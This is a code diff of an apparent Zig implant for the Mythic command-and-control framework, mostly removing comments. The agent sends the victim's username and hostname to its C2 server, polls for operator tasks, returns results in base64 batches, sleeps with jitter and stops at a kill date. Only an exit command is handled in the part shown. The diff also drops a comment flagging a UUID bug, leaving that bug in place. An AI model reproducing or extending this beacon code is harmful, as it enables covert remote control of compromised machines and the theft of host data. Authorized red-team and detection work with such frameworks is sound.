@@ -21,11 +21,9 @@ const SystemInfo = utils.SystemInfo;
 const CryptoUtils = utils.CryptoUtils;
 const TimeUtils = utils.TimeUtils;
 
-// Main Mythic agent structure
 pub const MythicAgent = struct {
     const Self = @This();
     
-    // Core properties
     allocator: Allocator,
     config: AgentConfig,
     uuid: []const u8,
@@ -35,11 +33,9 @@ pub const MythicAgent = struct {
     system_info: SystemInfo,
     crypto_utils: CryptoUtils,
     
-    // Crypto
-    aes_key: [32]u8,
+    aes_key: [32]u8, //For future use watch this space
     payload_uuid: []const u8,
     
-    // State
     tasks: ArrayList(MythicTask),
     pending_responses: ArrayList(MythicResponse),
     is_running: bool,
@@ -48,9 +44,8 @@ pub const MythicAgent = struct {
     pub fn init(allocator: Allocator, config: AgentConfig) !Self {
         var crypto_utils = CryptoUtils.init(allocator);
         
-        // Generate UUIDs and keys
         const uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
-        const session_id = try crypto_utils.generateSessionId();
+        const session_id = try crypto_utils.generateSessionId();//session_id might be useful later. Not implemented yet
         const aes_key = CryptoUtils.generateAESKey();
         const payload_uuid = "a5c7bb07-e66c-4893-a6e9-edbc19c01d31";
         
@@ -81,11 +76,9 @@ pub const MythicAgent = struct {
         self.network_client.deinit();
     }
     
-    // Main agent loop
     pub fn run(self: *Self) !void {
         self.is_running = true;
         
-        // Initial checkin
         try self.checkin();
         
         print("[+] Agent started with UUID: {s}\n", .{self.uuid});
@@ -93,7 +86,6 @@ pub const MythicAgent = struct {
         print("[+] Sleep interval: {d}s (jitter: {d:.1}%)\n", .{ self.config.sleep_interval, self.config.jitter * 100 });
         
         while (self.is_running) {
-            // Check for kill date
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
                     print("[!] Kill date reached, terminating agent\n", .{});
@@ -101,29 +93,23 @@ pub const MythicAgent = struct {
                 }
             }
             
-            // Get tasking from C2
             self.getTasks() catch |err| {
                 print("[!] Failed to get tasks: {}\n", .{err});
             };
             
-            // Process any pending tasks
             try self.processTasks();
             
-            // Send responses back to C2
             self.sendResponses() catch |err| {
                 print("[!] Failed to send responses: {}\n", .{err});
             };
             
-            // Sleep with jitter
             self.sleep();
         }
         
         print("[+] Agent terminated\n", .{});
     }
     
-    // Initial checkin with C2 server
     fn checkin(self: *Self) !void {
-        // Allocate and free system info fields
         const user = try self.system_info.getCurrentUser();
         defer self.allocator.free(user);
         const host = try self.system_info.getHostname();
@@ -159,7 +145,6 @@ pub const MythicAgent = struct {
         defer json_buffer.deinit();
         try json.stringify(checkin_data, .{}, json_buffer.writer());
 
-        // Combine PayloadUUID + JSON and Base64 encode
         var combined = std.ArrayList(u8).init(self.allocator);
         defer combined.deinit();
         try combined.appendSlice(self.payload_uuid);
@@ -171,13 +156,11 @@ pub const MythicAgent = struct {
         defer self.allocator.free(b64_data);
         _ = encoder.encode(b64_data, combined.items);
 
-        // Send to Mythic server
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
 
         print("[DEBUG] Response: {s}\n", .{response});
 
-        //Parse Base64-encoded response (CallbackUUID + JSON)
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
             print("[ERROR] Invalid Base64 response\n", .{});
             return error.InvalidBase64;
@@ -191,14 +174,12 @@ pub const MythicAgent = struct {
 
         print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
 
-        // Skip CallbackUUID
         if (response.len < 36) {
             print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
         const json_response = decoded_response[36..];
         print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
-        // Parse JSON response
         const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
             return err;
@@ -216,7 +197,6 @@ pub const MythicAgent = struct {
         self.last_checkin = TimeUtils.getCurrentTimestamp();
     }
     
-    // Get tasks from C2 server
     fn getTasks(self: *Self) !void {
         const get_tasking_data = .{
             .action = "get_tasking",
@@ -263,13 +243,10 @@ pub const MythicAgent = struct {
         print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
 
         
-        // Skip CallbackUUID 
         if (response.len < 36) {
             print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
-        //const json_response = response[36..];
-        // Parse JSON tasks
         const Task = struct {
             id: []const u8,
             command: []const u8,
@@ -279,7 +256,6 @@ pub const MythicAgent = struct {
         const json_response = decoded_response[36..];
         print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
         
-        // Parse JSON response
         const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
             return err;
@@ -294,14 +270,11 @@ pub const MythicAgent = struct {
                 task.parameters,
                 task.timestamp,
             });
-            
         }
     
-        // Parse response for new tasks
         try self.parseTaskResponse(json_response);
     }
     
-    // Parse task response from C2
     fn parseTaskResponse(self: *Self, response: []const u8) !void {
         const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch return;
         defer parsed.deinit();
@@ -325,14 +298,12 @@ pub const MythicAgent = struct {
         }
     }
     
-    // Process pending tasks
     fn processTasks(self: *Self) !void {
         for (self.tasks.items) |*task| {
             if (task.status == .submitted) {
                 task.status = .processing;
                 print("[*] Processing task: {s}\n", .{task.command});
                 
-                // Handle exit command
                 if (std.mem.eql(u8, task.command, "exit")) {
                     self.is_running = false;
                     const exit_response = MythicResponse{
@@ -364,8 +335,6 @@ pub const MythicAgent = struct {
         }
     }
     
-    // Send responses back to C2
-
     fn sendResponses(self: *Self) !void {
         if (self.pending_responses.items.len == 0) return;
 
@@ -393,18 +362,15 @@ pub const MythicAgent = struct {
             .responses = responses.items,
         };
 
-        // Step 1: Convert to JSON
         var json_buffer = std.ArrayList(u8).init(self.allocator);
         defer json_buffer.deinit();
         try json.stringify(response_data, .{}, json_buffer.writer());
 
-        // Step 2: Prepend UUID (callback UUID, not payload UUID)
         var combined = std.ArrayList(u8).init(self.allocator);
         defer combined.deinit();
-        try combined.appendSlice(self.payload_uuid); // Use self.uuid here
+        try combined.appendSlice(self.payload_uuid);
         try combined.appendSlice(json_buffer.items);
 
-        // Step 3: Base64 encode it
         const encoder = base64.standard.Encoder;
         const b64_len = encoder.calcSize(combined.items.len);
         const b64_data = try self.allocator.alloc(u8, b64_len);
@@ -414,17 +380,14 @@ pub const MythicAgent = struct {
         print("[DEBUG] Sending post_response with UUID {s}: {s}\n", .{ self.payload_uuid, json_buffer.items });
         print("[DEBUG] Base64 encoded response: {s}\n", .{b64_data});
 
-        // Step 4: Send the base64-encoded payload
         const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
 
         print("[+] Sent {} responses in batch\n", .{self.pending_responses.items.len});
 
-        // Step 5: Clear after successful send
         self.pending_responses.clearAndFree();
     }
 
-    // Sleep with jitter
     fn sleep(self: *Self) void {
         const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
         print("[*] Sleeping for {d} seconds...\n", .{sleep_time});
